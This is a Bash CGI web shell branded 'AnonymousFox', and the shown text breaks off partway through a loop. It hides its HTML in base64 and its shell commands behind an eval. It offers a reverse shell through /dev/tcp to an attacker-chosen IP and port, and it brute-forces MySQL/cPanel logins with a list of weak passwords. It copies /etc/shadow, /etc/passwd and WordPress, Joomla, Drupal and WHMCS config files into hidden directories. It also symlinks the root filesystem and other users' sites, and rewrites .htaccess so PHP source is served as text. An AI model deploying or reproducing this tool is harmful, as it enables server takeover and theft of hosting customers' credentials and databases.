#!/bin/bash -i

#


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
	echo "Warning: you should probably use MIME type "\
	     "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
	read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" 
	t="${t#*%}"       
	
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} 
	    t="${t:2}" 
	    v="${v}"`echo -e \\\\x${h}` 
	fi
    done
    
    echo "${v}"
    return
}


function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
	GET)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    ;;
	POST)
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
	    ;;
	BOTH)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
	    ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
	p="${q%%&*}"  # get first part of query string
	k="${p%%=*}"  # get the key (variable name) from it
	v="${p#*=}"   # get the value from it
	q="${q#$p&*}" # strip first part from query string
	# decode and evaluate var if requested
	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
	    eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL



if [ $cc2 -eq 4 ] ; then
clear
echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
exit
else

if [ -n "$xx"  ] ; then
echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
else
echo -e "Content-type: text/html\n\n"
fi

fi
echo 'PGh0bWw+PHRpdGxlPkFub255bW91c0ZveCBTaGVsbDwvdGl0bGU+CjxoZWFkPgo8c3R5bGU+Cgpib2R5CnsKCWJhY2tncm91bmQ6ICMzMzM7Cgljb2xvcjogI0Y1RjVGNTsKCglwYWRkaW5nOiAxMHB4OwoKfQoKCmE6bGluaywgYm9keV9hbGluawp7Cgljb2xvcjogI0ZGOTkzMzsKCXRleHQtZGVjb3JhdGlvbjogbm9uZTsKfQphOnZpc2l0ZWQsIGJvZHlfYXZpc2l0ZWQKewoJY29sb3I6ICNGRjk5MzM7Cgl0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KYTpob3ZlciwgYTphY3RpdmUsIGJvZHlfYWhvdmVyCnsKCWNvbG9yOiAjRkZGRkZGOwoJdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9Cgp0ZXh0YXJlYQp7Cglib3JkZXI6IDFweCBzb2xpZDsKCWN1cnNvcjogZGVmYXVsdDsKCQoJYmFja2dyb3VuZDogIzAwMDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQoKaW5wdXQKewoJYm9yZGVyOiAxcHggc29saWQ7CgljdXJzb3I6IGRlZmF1bHQ7CglvdmVyZmxvdzogaGlkZGVuOwoJYmFja2dyb3VuZDogIzAwMDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQppbnB1dC5idXR0b24gewpmb250LWZhbWlseTogQ291cmllciBOZXc7CmNvbG9yOiAjZmZmZmZmOwpmb250LXNpemU6IDE2cHg7CnBhZGRpbmc6IDEwcHg7CnRleHQtZGVjb3JhdGlvbjogbm9uZTsKLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA4cHg7Ci1tb3otYm9yZGVyLXJhZGl1czogOHB4Owotd2Via2l0LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFiYWI7Ci1tb3otYm94LXNoYWRvdzogMHB4IDFweCAzcHggI2FiYWJhYjsKdGV4dC1zaGFkb3c6IDFweCAxcHggM3B4ICM2NjY2NjY7CmJvcmRlcjogc29saWQgI2RlZGJkZSAxcHg7CmJhY2tncm91bmQ6ICM5MDkwOTAgOwp9Ci5idXR0b246aG92ZXIgewpiYWNrZ3JvdW5kOiAjQjBCMEIwOwp9CgogZGl2LmJveAp7CmNvbG9yOiAjMzMzOwpib3JkZXI6M3B4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6MTBweCA0MHB4OyAKYmFja2dyb3VuZDojZThlOGU4Owp3aWR0aDo5NCU7CmJvcmRlci1yYWRpdXM6MjVweDsKLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICovCn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48YSBocmVmPSJodHRwczovL2Fub255bW91c2ZveC5jby8iPjxpbWcgc3JjPSJodHRwOi8vYW5vbnltb3VzZm94Lnh5ei9fQGltYWdlcy9sb2dvMi5wbmciPjwvYT48L2NlbnRlcj4KPC9wcmU+Cgo8ZGl2IGFsaWduPSJjZW50ZXIiPg==' | base64 -d

 function login()
{
echo 'RW50ZXIgcGFzc3dvcmQ8YnI+Cjxicj48Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCQoJ
PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+Cgk8ZGl2IGFsaWduPSJjZW50ZXIiPjx0YWJs
ZSBib3JkZXI9IjAiIHdpZHRoPSIxMjAiIGlkPSJ0YWJsZTEiIGNlbGxzcGFjaW5nPSIwIiBjZWxs
cGFkZGluZz0iMCI+PHRyPjx0ZCA+CjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0ieHgiIHNp
emU9IjEwMCIgdmFsdWU9IiIvPgo8L3RkPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJi
dXR0b24xIiB2YWx1ZT0iU2VuZCIgLz48L3RkPjwvdHI+PC90YWJsZT48L2Rpdj48L2Zvcm0+PGJy
Pjxicj4KPGJyPjxicj48aHI+CjxjZW50ZXI+Q29kZWQgYnkgQW5vbnltb3VzRm94PC9jZW50ZXI+' | base64 -d

  return

	}
	



    echo "$HTTP_COOKIE" | grep -qi "$pass"
    if [ $? == 0 ]
    then
    echo ""
    else
login
exit
    fi
	

echo 'PHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgkJPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iICAgSG9tZSAgICAiIC8+DQoJPC9mb3JtPg0KCTwvdGQ+PHRkPg0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIxIiAgLz4gCTxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IiAgIFNob3cgVXNlciAgICAiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCjx0ZD4NCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjIiICAvPg0KCQk8aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24iIHZhbHVlPSIgU2hvdyAgIERvbWFpbnMgIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIzIiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJTeW1MaW5rIC4uLy5GMHgiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCg0KPHRkPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJDQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iMzMiICAvPg0KCQ0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidXR0b24iIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IkNvcHkgLi4vLkZveCIgLz4NCgk8L2Zvcm0+DQo8L3RkPg0KDQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSI1IiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDcGFuZWwiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCg0KPHRkPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJDQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iNyIgIC8+DQoJDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iQkFDSy1DT05ORUNUIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8L3RyPjwvdGFibGU+DQogDQo8L2Rpdj4NCg0KPC9jZW50ZXI+' | base64 -d
if [ $cc2 -eq 7 ] ; then
echo '<br><form method="post" action="">
	
	<form method="post" action="">
	<div align="center">'
echo 'IP <input type="text" name="bip" size="50" value="';echo $REMOTE_ADDR;echo '"/><br>
Port <input type="text" name="bport" size="50" value="443"/></form><br><br>
<input type="hidden" name="cc2" value="8"  /><br>
<input type="submit" class="button" name="button" value="CONNECT" />'
echo "<br><br><hr><center>"
fi
if [ $cc2 -eq 8 ] ; then
bash -i >& /dev/tcp/$bip/$bport 0>&1
fi
if [ $cc2 -eq 6 ] ; then
echo '<pre>'



arr1=$(echo $listu | tr "\r" "\n")
arr2=$(echo $listp | tr "\r" "\n")
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
for x in $arr1
do
for y in $arr2
do
mysql -u$x -p$y  ;

if [ $? -eq 0 ] ; then
echo "Found Cpanel User $x Password ($y)"
fi

done
done
echo "</xmp></div></pre></td></tr></table>"
fi
if [ $cc2 -eq 5 ] ; then
echo '<form method="post" action="">
	<center> 
	<form method="post" action="">
Users
<br>
<textarea name="listu" cols="50" rows="15">'
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`;echo '</textarea>
<br>
Password
<br>
<textarea name="listp" cols="50" rows="15">123
1234
12345
123456
1234567
123456789
1234567890
123123
123321</textarea>

	<input type="hidden" name="cc2" value="6"  />
	<br>
	<br>
	<input type="submit" class="button" name="button" value="Send" />
	</form>
	<center>
'

fi





if [ $cc2 -eq 1 ] ; then
echo '<div align="center">'
echo "<xmp>"
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`
echo "</xmp>"
echo "</div>"
fi

if [ $cc2 -eq 2 ] ; then
echo "<br><center><table border='1' width='45%' cellspacing='0' bordercolor='#a3a3a3' cellpadding='0' align='center'><tr><td bgcolor='#000000' align='center'>Domain</td><td align='center' bgcolor='#000000'>User</td></tr>"

for i in `cat /etc/named.conf | uniq |grep '^zone' |grep -v '"."' |grep -v '"0.0.127.in-addr.arpa"' |cut -d ' ' -f 2  |cut -d '"' -f 2| sort | uniq `; do echo "<td align='center'>$i</td><td align='center'>" ; ls -dl /etc/valiases/$i |cut -d ' ' -f 3 ; echo "</td></tr>"; done

echo "</table></center><br>"
fi
if [ $cc2 -eq 33 ] ; then
echo "<xmp>"
mkdir ../.Fox
 echo 'DirectoryIndex ssssss.htm' >> ../.Fox/.htaccess 
 echo 'AddType txt .php' >> ../.Fox/.htaccess 
 echo 'AddHandler txt .php' >> ../.Fox/.htaccess 
 echo 'AddType txt .html' >> ../.Fox/.htaccess 
 echo 'AddHandler txt .html' >> ../.Fox/.htaccess 
 echo 'Options all' >> ../.Fox/.htaccess 
 echo 'ReadmeName AnonymousFox.txt' >> ../.Fox/.htaccess
 echo 'Q29kZWQgYnkgQW5vbnltb3VzRm94IDsp'| base64 -d > ../.Fox/AnonymousFox.txt
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "cp /home/$i/public_html/.accesshash ../.Fox/$i-public_html-accesshash-WHMCS.txt";
eval "cp /home/$i/.accesshash ../.Fox/$i-accesshash-WHMCS.txt";
eval "cp /home/$i/public_html/members/configuration.php ../.Fox/$i-members-public_html.txt";
eval "cp /home/$i/members/configuration.php ../.Fox/$i-members.txt";
eval "cp /home/$i/public_html/member/configuration.php ../.Fox/$i-member-public_html.txt";
eval "cp /home/$i/member/configuration.php ../.Fox/$i-member.txt";
eval "cp /home/$i/public_html/client/configuration.php ../.Fox/$i-client-public_html.txt";
eval "cp /home/$i/client/configuration.php ../.Fox/$i-client.txt";
eval "cp /home/$i/public_html/clients/configuration.php ../.Fox/$i-clients-public_html.txt";
eval "cp /home/$i/public_html/order/configuration.php ../.Fox/$i-order-public_html.txt";
eval "cp /home/$i/public_html/core/configuration.php ../.Fox/$i-core-public_html.txt";
eval "cp /home/$i/public_html/host/configuration.php ../.Fox/$i-host-public_html.txt";
eval "cp /home/$i/public_html/hosting/configuration.php ../.Fox/$i-hosting-public_html.txt";
eval "cp /home/$i/order/configuration.php ../.Fox/$i-order-WHMCS.txt";
eval "cp /home/$i/core/configuration.php ../.Fox/$i-core-WHMCS.txt";
eval "cp /home/$i/host/configuration.php ../.Fox/$i-host-WHMCS.txt";
eval "cp /home/$i/hosting/configuration.php ../.Fox/$i-hosting-WHMCS.txt";
eval "cp /home/$i/clients/configuration.php ../.Fox/$i-clients.txt";
eval "cp /home/$i/public_html/clientarea/configuration.php ../.Fox/$i-clientarea-public_html.txt";
eval "cp /home/$i/clientarea/configuration.php ../.Fox/$i-clientarea.txt";
eval "cp /home/$i/public_html/billing/configuration.php ../.Fox/$i-billing-public_html.txt";
eval "cp /home/$i/billing/configuration.php ../.Fox/$i-billing.txt";
eval "cp /home/$i/public_html/billings/configuration.php ../.Fox/$i-billings-public_html.txt";
eval "cp /home/$i/billings/configuration.php ../.Fox/$i-billings.txt";
eval "cp /home/$i/public_html/whmcs/configuration.php ../.Fox/$i-whmcs-public_html.txt";
eval "cp /home/$i/whmcs/configuration.php ../.Fox/$i-whmcs.txt";
eval "cp /home/$i/public_html/whm/configuration.php ../.Fox/$i-whm-public_html.txt";
eval "cp /home/$i/whm/configuration.php ../.Fox/$i-whm.txt";
eval "cp /home/$i/public_html/whmc/configuration.php ../.Fox/$i-whmc-public_html.txt";
eval "cp /home/$i/whmc/configuration.php ../.Fox/$i-whmc.txt";
eval "cp /home/$i/public_html/support/configuration.php ../.Fox/$i-support-public_html.txt";
eval "cp /home/$i/support/configuration.php ../.Fox/$i-support.txt";
eval "cp /home/$i/public_html/supports/configuration.php ../.Fox/$i-supports-public_html.txt";
eval "cp /home/$i/supports/configuration.php ../.Fox/$i-supports.txt";
eval "cp /home/$i/public_html/my/configuration.php ../.Fox/$i-my-public_html.txt";
eval "cp /home/$i/my/configuration.php ../.Fox/$i-my.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../.Fox/$i-portal-public_html.txt";
eval "cp /home/$i/portal/configuration.php ../.Fox/$i-portal.txt";
eval "cp /home/$i/public_html/clientarea/configuration.php ../.Fox/$i-clientarea.txt";
eval "cp /home/$i/public_html/clients/configuration.php ../.Fox/$i-client.txt";
eval "cp /home/$i/public_html/billing/configuration.php ../.Fox/$i-billing.txt";
eval "cp /home/$i/public_html/billings/configuration.php ../.Fox/$i-billings.txt";
eval "cp /home/$i/public_html/whmcs/configuration.php ../.Fox/$i-whmcs2.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../.Fox/$i-whmcs3.txt";
eval "cp /home/$i/public_html/my/configuration.php ../.Fox/$i-whmcs4.txt";
eval "cp /home/$i/public_html/whm/configuration.php ../.Fox/$i-whm.txt";
eval "cp /home/$i/public_html/whmc/configuration.php ../.Fox/$i-whmc.txt";
eval "cp /home/$i/public_html/support/configuration.php ../.Fox/$i-support.txt";
eval "cp /home/$i/public_html/supports/configuration.php ../.Fox/$i-supports.txt";
eval "cp /home/$i/public_html/vb/includes/config.php ../.Fox/$i-vb.txt";
eval "cp /home/$i/public_html/includes/config.php ../.Fox/$i-vb2.txt";
eval "cp /home/$i/public_html/config.php ../.Fox/$i-2.txt";
eval "cp /home/$i/public_html/forum/includes/config.php ../.Fox/$i-forum.txt";
eval "cp /home/$i/public_html/forums/includes/config.php ../.Fox/$i-forums.txt";
eval "cp /home/$i/public_html/admin/conf.php ../.Fox/$i-5.txt";
eval "cp /home/$i/public_html/admin/config.php ../.Fox/$i-4.txt";
eval "cp /home/$i/public_html/configuration.php ../.Fox/$i-joomla.txt";
eval "cp /home/$i/public_html/joomla/configuration.php ../.Fox/$i-joomla-joomla.txt";
eval "cp /home/$i/public_html/new/configuration.php ../.Fox/$i-joomla-new.txt";
eval "cp /home/$i/public_html/old/configuration.php ../.Fox/$i-joomla-old.txt";
eval "cp /home/$i/public_html/web/configuration.php ../.Fox/$i-joomla-web.txt";
eval "cp /home/$i/public_html/portal/configuration.php ../.Fox/$i-joomla-portal.txt";
eval "cp /home/$i/public_html/site/configuration.php ../.Fox/$i-joomla-site.txt";
eval "cp /home/$i/public_html/test/configuration.php ../.Fox/$i-joomla-test.txt";
eval "cp /home/$i/public_html/demo/configuration.php ../.Fox/$i-joomla-demo.txt";
eval "cp /home/$i/public_html/sites/default/settings.php ../.Fox/$i-drupal.txt";
eval "cp /home/$i/public_html/drupal/sites/default/settings.php ../.Fox/$i-drupal2.txt";
eval "cp /home/$i/public_html/wp-config.php ../.Fox/$i-wordpress.txt";
eval "cp /home/$i/public_html/blog/wp-config.php ../.Fox/$i-wordpress-blog.txt";
eval "cp /home/$i/public_html/blogs/wp-config.php ../.Fox/$i-wordpress-blogs.txt";
eval "cp /home/$i/public_html/wp/wp-config.php ../.Fox/$i-wordpress-wp.txt";
eval "cp /home/$i/public_html/beta/wp-config.php ../.Fox/$i-wordpress-beta.txt";
eval "cp /home/$i/public_html/wordpress/wp-config.php ../.Fox/$i-wordpress-wordpress.txt";
eval "cp /home/$i/public_html/new/wp-config.php ../.Fox/$i-wordpress-new.txt";
eval "cp /home/$i/public_html/old/wp-config.php ../.Fox/$i-wordpress-old.txt";
eval "cp /home/$i/public_html/demo/wp-config.php ../.Fox/$i-wordpress-demo.txt";
eval "cp /home/$i/public_html/test/wp-config.php ../.Fox/$i-wordpress-test.txt";
eval "cp /home/$i/public_html/site/wp-config.php ../.Fox/$i-wordpress-site.txt";
eval "cp /home/$i/public_html/web/wp-config.php ../.Fox/$i-wordpress-web.txt";
eval "cp /home/$i/public_html/portal/wp-config.php ../.Fox/$i-wordpress-portal.txt";
eval "cp /home/$i/public_html/conf_global.php ../.Fox/$i-6.txt";
eval "cp /home/$i/public_html/include/db.php ../.Fox/$i-7.txt";
eval "cp /home/$i/public_html/connect.php ../.Fox/$i-8.txt";
eval "cp /home/$i/public_html/mk_conf.php ../.Fox/$i-9.txt";
eval "cp /home/$i/public_html/include/config.php ../.Fox/$i-10.txt";
eval "cp /etc/passwd ../.Fox/passwd.txt";
eval "cp /etc/shadow ../.Fox/shadow.txt";
eval "cp /etc/named.conf ../.Fox/named.conf.txt";
eval "cp /home/$i/.my.cnf ../.Fox/$i-cPanel.txt" ;
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5rJyBocmVmPScuLi8uRm94Jz5DbGljayBoZXJlPC9hPiA8L2Rpdj4=' | base64 -d
fi
if [ $cc2 -eq 3 ] ; then
echo "<xmp>"
mkdir ../.F0x
mkdir ../.F0x/F0xSym
mkdir ../.F0x/F0xConfig
mkdir ../.F0x/F0xConfig/WordPress
mkdir ../.F0x/F0xConfig/Joomla
mkdir ../.F0x/F0xConfig/Drupal
mkdir ../.F0x/F0xConfig/Other
mkdir ../.F0x/F0xConfig/WHMCS
mkdir ../.F0x/F0xJump
mkdir ../.F0x/F0xUpload
mkdir ../.F0x/F0xHtaccess
mkdir ../.F0x/F0xContactEmail
mkdir ../.F0x/F0xData
mkdir ../.F0x/F0xData/F0xSDU
mkdir ../.F0x/F0xData/cPanel 
 echo 'DirectoryIndex ssssss.htm' >> ../.F0x/.htaccess 
 echo 'AddType txt .php' >> ../.F0x/.htaccess 
 echo 'AddHandler txt .php' >> ../.F0x/.htaccess 
 echo 'AddType txt .html' >> ../.F0x/.htaccess 
 echo 'AddHandler txt .html' >> ../.F0x/.htaccess 
 echo 'Options all' >> ../.F0x/.htaccess 
 echo 'ReadmeName AnonymousFox.txt' >> ../.F0x/.htaccess
 echo 'Q29kZWQgYnkgQW5vbnltb3VzRm94IDsp'| base64 -d > ../.F0x/AnonymousFox.txt
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xSym/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xConfig/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xConfig/WordPress/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xConfig/Joomla/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xConfig/Drupal/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xConfig/WHMCS/.htaccess 
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xConfig/Other/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xJump/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xUpload/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xHtaccess/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xContactEmail/.htaccess
 echo 'ReadmeName ../AnonymousFox.txt' >> ../.F0x/F0xData/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xData/F0xSDU/.htaccess
 echo 'ReadmeName ../../AnonymousFox.txt' >> ../.F0x/F0xData/cPanel/.htaccess
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "ln -s / ../.F0x/F0xSym/r00t" ;
eval "ln -s /home/$i/public_html/ ../.F0x/F0xJump/0-$i" ;
eval "ln -s /home/$i/public_html/.accesshash ../.F0x/F0xConfig/WHMCS/$i-public_html-accesshash-WHMCS.txt";
eval "ln -s /home/$i/.accesshash ../.F0x/F0xConfig/WHMCS/$i-accesshash-WHMCS.txt";
eval "ln -s /home/$i/public_html/members/configuration.php ../.F0x/F0xConfig/WHMCS/$i-members-public_html.txt";
eval "ln -s /home/$i/members/configuration.php ../.F0x/F0xConfig/WHMCS/$i-members.txt";
eval "ln -s /home/$i/public_html/configuration.php ../.F0x/F0xConfig/WHMCS/$i-configuration-WHMCS.txt";
eval "ln -s /home/$i/public_html/order/configuration.php ../.F0x/F0xConfig/WHMCS/$i-order-public_html.txt";
eval "ln -s /home/$i/public_html/core/configuration.php ../.F0x/F0xConfig/WHMCS/$i-core-public_html.txt";
eval "ln -s /home/$i/public_html/host/configuration.php ../.F0x/F0xConfig/WHMCS/$i-host-public_html.txt";
eval "ln -s /home/$i/public_html/hosting/configuration.php ../.F0x/F0xConfig/WHMCS/$i-hosting-public_html.txt";
eval "ln -s /home/$i/public_html/manage/configuration.php ../.F0x/F0xConfig/WHMCS/$i-manage-public_html.txt";
eval "ln -s /home/$i/manage/configuration.php ../.F0x/F0xConfig/WHMCS/$i-manage.txt";
eval "ln -s /home/$i/order/configuration.php ../.F0x/F0xConfig/WHMCS/$i-order-WHMCS.txt";
eval "ln -s /home/$i/core/configuration.php ../.F0x/F0xConfig/WHMCS/$i-core-WHMCS.txt";
eval "ln -s /home/$i/host/configuration.php ../.F0x/F0xConfig/WHMCS/$i-host-WHMCS.txt";
eval "ln -s /home/$i/domains/configuration.php ../.F0x/F0xConfig/WHMCS/$i-domains-WHMCS.txt";
eval "ln -s /home/$i/public_html/domains/configuration.php ../.F0x/F0xConfig/WHMCS/$i-domains-public_html.txt";
eval "ln -s /home/$i/hosting/configuration.php ../.F0x/F0xConfig/WHMCS/$i-hosting-WHMCS.txt";
eval "ln -s /home/$i/public_html/member/configuration.php ../.F0x/F0xConfig/WHMCS/$i-member-public_html.txt";
eval "ln -s /home/$i/public_html/clientes/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clientes-public_html.txt";
eval "ln -s /home/$i/clientes/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clientes.txt";
eval "ln -s /home/$i/member/configuration.php ../.F0x/F0xConfig/WHMCS/$i-member.txt";
eval "ln -s /home/$i/public_html/client/configuration.php ../.F0x/F0xConfig/WHMCS/$i-client-public_html.txt";
eval "ln -s /home/$i/client/configuration.php ../.F0x/F0xConfig/WHMCS/$i-client.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clients-public_html.txt";
eval "ln -s /home/$i/clients/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clients.txt";
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clientarea-public_html.txt";
eval "ln -s /home/$i/clientarea/configuration.php ../.F0x/F0xConfig/WHMCS/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../.F0x/F0xConfig/WHMCS/$i-billing-public_html.txt";
eval "ln -s /home/$i/billing/configuration.php ../.F0x/F0xConfig/WHMCS/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../.F0x/F0xConfig/WHMCS/$i-billings-public_html.txt";
eval "ln -s /home/$i/billings/configuration.php ../.F0x/F0xConfig/WHMCS/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whmcs-public_html.txt";
eval "ln -s /home/$i/whmcs/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whmcs.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whm-public_html.txt";
eval "ln -s /home/$i/whm/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whmc-public_html.txt";
eval "ln -s /home/$i/whmc/configuration.php ../.F0x/F0xConfig/WHMCS/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../.F0x/F0xConfig/WHMCS/$i-support-public_html.txt";
eval "ln -s /home/$i/support/configuration.php ../.F0x/F0xConfig/WHMCS/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../.F0x/F0xConfig/WHMCS/$i-supports-public_html.txt";
eval "ln -s /home/$i/supports/configuration.php ../.F0x/F0xConfig/WHMCS/$i-supports.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../.F0x/F0xConfig/WHMCS/$i-my-public_html.txt";
eval "ln -s /home/$i/my/configuration.php ../.F0x/F0xConfig/WHMCS/$i-my.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../.F0x/F0xConfig/WHMCS/$i-portal-public_html.txt";
eval "ln -s /home/$i/portal/configuration.php ../.F0x/F0xConfig/WHMCS/$i-portal.txt";
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../.F0x/F0xConfig/Other/$i-clientarea.txt";
